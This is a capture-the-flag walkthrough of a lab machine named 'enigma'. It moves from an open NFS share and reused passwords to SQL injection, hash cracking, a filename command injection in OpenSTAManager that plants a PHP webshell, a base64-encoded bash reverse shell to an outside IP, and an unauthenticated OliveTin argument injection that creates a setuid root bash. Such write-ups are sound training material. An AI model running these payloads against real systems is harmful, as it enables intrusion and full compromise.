

## 1. Reconnaissance

I started with an Nmap scan to identify open ports and running services.

```
nmap -sV enigma.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-21 12:53 +0200
Nmap scan report for enigma.htb (10.129.106.59)
Host is up (0.035s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain?
80/tcp   open  http     nginx 1.24.0 (Ubuntu)
110/tcp  open  pop3     Dovecot pop3d
111/tcp  open  rpcbind  2-4 (RPC #100000)
143/tcp  open  imap     Dovecot imapd (Ubuntu)
993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp  open  ssl/pop3 Dovecot pop3d
2049/tcp open  nfs_acl  3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.96 seconds
```

Nothing exotic here: SSH, an nginx web server, a mail stack (Dovecot pop3/imap), RPC, and NFS. NFS exposed and world-mountable is usually worth checking first on boxes like this.

## 2. Enumeration & Initial Foothold

### 2.1 NFS leak

```
showmount -e enigma.htb
Exports list on enigma.htb:
/srv/nfs/onboarding                 *

sudo mount -t nfs -o vers=3,resvport,rw enigma.htb:/srv/nfs/onboarding ~/nfs_mount
cd ~/nfs_mount
ls
New_Employee_Access.pdf
```

The share was open to anyone, no IP restriction. Inside, a single PDF that reads like classic onboarding paperwork — exactly the kind of file that tends to leak a temp password:

```
Enigma Corp
IT Department - New Employee System Access

Employee:     Kevin Mitchell
Department:   Operations
Provisioned by: IT Department
Date:         2024-03-01

Webmail Access
URL:      http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!

Please change your password upon first login.
For support contact: it@enigma.htb

This document contains confidential internal information intended solely for the recipient.
Unauthorized access, disclosure, or distribution is strictly prohibited.
Generated automatically by Enigma Corp Identity Management System.
```

Kevin's webmail creds worked, and inside the inbox I saw another user, Sarah. The PDF explicitly tells Kevin to change his password after first login, and nothing about this org suggested anyone actually bothers — so I tried Sarah's account with the same default password. It worked.

### 2.2 Password reuse leads to OpenSTAManager

Sarah's inbox had another set of credentials, provisioned the exact same lazy way:

```
Hi Sarah,

Apologies for the delay. I have provisioned your access. Please find the details below:

URL:      http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s

Note: I will create a dedicated account for you shortly, for now you can use the admin
account to get started.

Regards,
IT Support
Enigma Corp
```

That's an OpenSTAManager instance. I logged in as admin and started poking around the app for known issues.

### 2.3 SQL injection → password hash

While exploring the app I found a SQL injection point and used it to dump data from the database. Digging through the users table turned up a bcrypt hash for another user, haris:

```
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris
```

Cracked it offline:

```
hashcat -m 3200 hash.txt Documents/CTF/rockyou.txt --show
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
```

I held onto this password rather than using it right away — it turned out to be reused at the OS level too.

### 2.4 RCE via OpenSTAManager (P7M filename injection)

The OpenSTAManager version in use is vulnerable to OS command injection through its P7M signature verification, which shells out to OpenSSL without sanitizing the filename. I built a malicious zip whose filename breaks out of the intended command:

```
python3 -c "import zipfile; cmd = 'cd files && echo \"<?php system(\$_GET[\"c\"]); ?>\" > SHELL.php'; malicious_filename = 'invoice.p7m\";' + cmd + ';echo \".p7m'; zf = zipfile.ZipFile('exploit.zip', 'w'); zf.writestr(malicious_filename, b'DUMMY_P7M_CONTENT'); zf.close()"
```

Uploaded it through the app's import feature:

```
curl -X POST http://support_001.enigma.htb/actions.php \
  -F "blob1=@exploit.zip" \
  -F "op=save" \
  -F "id_module=14" \
  -F "id_plugin=48" \
  -b "PHPSESSID=10fcc3c3cdccf2466ada216d5839084b"
```

The app threw a parser error on the dummy P7M content, which is expected — by that point the injected filename had already been evaluated by the shell and the webshell was dropped. Confirmed and used it to get a reverse shell:

```
echo -n 'bash -i >& /dev/tcp/10.10.14.227/4444 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjcvNDQ0NCAwPiYx

curl -G -X GET "http://support_001.enigma.htb/files/SHELL.php" \
  --data-urlencode "c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMjcvNDQ0NCAwPiYx | base64 -d | bash" \
  -b "PHPSESSID=10fcc3c3cdccf2466ada216d5839084b"
```

Shell landed as `www-data`.

## 3. User Flag

The cracked password from the SQL dump (`bestfriends`) turned out to be haris's actual system password, not just an app credential:

```
www-data@enigma:~/html/openstamanager$ su - haris
Password: bestfriends
$ ls
mail
user.txt
$ cat user.txt
78d61cc3f120c5ca24592c058de7e8e4
```

## 4. Privilege Escalation

Logged in as haris, the obvious first check is sudo rights:

```
haris@enigma:~$ sudo -l
[sudo] password for haris:
Sorry, user haris may not run sudo on enigma
```

No luck there, so I moved to process enumeration and found something running as root that stood out:

```
haris@enigma:~$ ps -ef | grep -i olive
root      1440     1  0 17:41 ?        00:00:00 /usr/local/bin/OliveTin
```

OliveTin is a small web dashboard that runs predefined shell commands on demand — basically a self-hosted "click a button, run a script" tool. If it's misconfigured, that's a direct line to arbitrary command execution as whatever user runs it. Its config file confirmed exactly that kind of misconfiguration:

```
haris@enigma:~$ cat /etc/OliveTin/config.yaml
---SNIP---
authRequireGuestsToLogin: false
---SNIP---
authLocalUsers:
  enabled: true
#  users:
#    - username: alice
#      usergroup: admins
#      password: "$argon2id$..."
---SNIP---
```

`authRequireGuestsToLogin: false` means unauthenticated requests are treated as valid — no login required to trigger actions. Combined with the fact that the `users:` block is entirely commented out, this instance has effectively no auth at all. One of the configured actions immediately stood out as exploitable:

```
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_user
      type: ascii_identifier
    - name: db_pass
      type: password
    - name: db_name
      type: ascii_identifier
```

The `db_pass` argument is typed as `password` in the UI, but that's purely cosmetic — OliveTin doesn't sanitize the value before dropping it into the shell string. Since it sits inside single quotes in the `mysqldump` command, closing that quote early lets me break out of the intended argument and chain my own command onto the same shell invocation.

Before crafting a payload I needed the actual API identifier OliveTin expects for this action (`bindingId`). The dashboard endpoint exposes it:

```
curl -s http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/GetDashboard \
  -H 'Content-Type: application/json' \
  --data '{}' \
  | jq '.. | objects | select(.title? == "Backup Database") | .action'
```

```
{
  "bindingId": "backup_database",
  "canExec": true,
  ...
}
```

`canExec: true` on a completely unauthenticated request was the confirmation I needed — this action is reachable without ever logging in. With the `bindingId` known, I built a payload that breaks out of the `db_pass` quote and drops a setuid copy of bash, which is a cleaner target than trying to smuggle an interactive shell through the API directly:

```
actionId='backup_database'
cmd="install -m 4755 /bin/bash /tmp/.bs"

cat > /tmp/backdoor.json <<JSON
{
  "actionId": "$actionId",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x' ; $cmd ; #"},
    {"name": "db_name", "value": "production"}
  ]
}
JSON

curl -s -X POST \
  -H 'Content-Type: application/json' \
  --data @/tmp/backdoor.json \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait
```

The response confirmed a clean execution, and — fittingly — the action log lists the requester as `guest`:

```
"logEntry":{ ..., "user":"guest", "exitCode":0, "bindingId":"backup_database" }
```

## 5. Root Flag

`/tmp/.bs` is now a setuid-root copy of bash. Running it as-is would still drop me back to haris, since bash resets its effective UID to the real UID by default when they differ. The `-p` flag stops that reset and keeps the effective UID at root:

```
haris@enigma:~$ /tmp/.bs -p
.bs-5.2# id
uid=1000(haris) gid=1000(haris) euid=0(root) groups=1000(haris),100(users)
.bs-5.2# whoami
root
.bs-5.2# cat /root/root.txt
bedf5eb58c59277c1574286487fe1653
```

The `id` output tells the real story here: `uid=1000(haris)` never changes, but `euid=0(root)` is what the kernel actually checks for permission — which is exactly what the setuid bit on `/tmp/.bs` bought me.
